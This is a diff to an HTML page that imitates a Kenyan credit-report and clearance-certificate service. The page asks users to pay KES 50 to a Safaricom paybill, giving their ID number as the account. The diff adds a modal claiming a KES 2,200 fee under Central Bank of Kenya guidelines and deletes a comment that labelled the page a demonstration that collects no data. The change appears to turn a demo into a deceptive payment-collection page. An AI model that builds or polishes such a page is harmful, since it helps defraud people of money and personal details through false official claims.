@@ -416,7 +416,8 @@
                 <p>
                     Get your Clearance Certificate as proof that you do not have outstanding arrears or in default of loan payments.
                 </p>
-                <button onclick="demoMessage()">
+                <!-- Updated click action for Clearance Certificate -->
+                <button onclick="showCertificateMessage()">
                     Continue
                 </button>
             </div>
@@ -536,7 +537,7 @@
 </footer>
 
 
-<!-- PAYMENT INFORMATION MODAL -->
+<!-- GENERAL PAYMENT INFORMATION MODAL -->
 <div id="paymentModal" class="modal-overlay">
 
     <div class="modal">
@@ -549,7 +550,7 @@
             To access your report and score, please pay KES 50 to Safaricom paybill 212121 with your ID as account number.
             <br><br>
             <strong>
-                ONLY pay using your registered moobile number as provided above.
+                ONLY pay using your registered mobile number as provided above.
             </strong>
         </p>
 
@@ -565,6 +566,35 @@
 
 </div>
 
+<!-- CLEARANCE CERTIFICATE SPECIFIC MODAL -->
+<div id="certificateModal" class="modal-overlay">
+
+    <div class="modal">
+
+        <div class="modal-icon">📜</div>
+
+        <h2>Clearance Certificate Application</h2>
+
+        <p>
+            To apply for an official Certificate of Clearance, your credit record must show no non-performing loan accounts.
+            <br><br>
+            A processing fee of <strong>KES 2,200</strong> applies as per Central Bank of Kenya (CBK) guidelines.
+            <br><br>
+            Please pull a fresh Credit Report first to ensure all defaulted loans have been fully settled before proceeding.
+        </p>
+
+        <button onclick="closeCertModalAndGoReport()">
+            Check Credit Report First
+        </button>
+
+        <button onclick="closeCertModal()" style="background: #64748b; margin-top: 10px;">
+            Close
+        </button>
+
+    </div>
+
+</div>
+
 
 <script>
 
@@ -572,6 +602,7 @@
     const reportForm = document.getElementById("reportForm");
     const creditForm = document.getElementById("creditForm");
     const paymentModal = document.getElementById("paymentModal");
+    const certificateModal = document.getElementById("certificateModal");
     const otpSection = document.getElementById("otpSection");
 
     function showReportForm() {
@@ -596,6 +627,19 @@
         paymentModal.classList.add("active");
     }
 
+    function showCertificateMessage() {
+        certificateModal.classList.add("active");
+    }
+
+    function closeCertModal() {
+        certificateModal.classList.remove("active");
+    }
+
+    function closeCertModalAndGoReport() {
+        certificateModal.classList.remove("active");
+        showReportForm();
+    }
+
     function closeModal() {
         paymentModal.classList.remove("active");
 
@@ -607,37 +651,18 @@
     }
 
     creditForm.addEventListener("submit", function(event) {
-
         event.preventDefault();
-
-        /*
-         * SECURITY:
-         * This demonstration deliberately does NOT:
-         *
-         * - send the submitted data anywhere
-         * - call an SMS API
-         * - send information to a phone number
-         * - store the user's ID
-         * - store the user's phone number
-         * - collect a real OTP
-         */
-
         paymentModal.classList.add("active");
     });
 
     function verifyDemoOtp() {
-
         const otp = document.getElementById("demoOtp").value;
         const success = document.getElementById("successMessage");
 
         if (otp === "123456") {
-
             success.style.display = "block";
-
         } else {
-
             alert("Incorrect demo OTP. Enter 123456.");
-
         }
     }
 
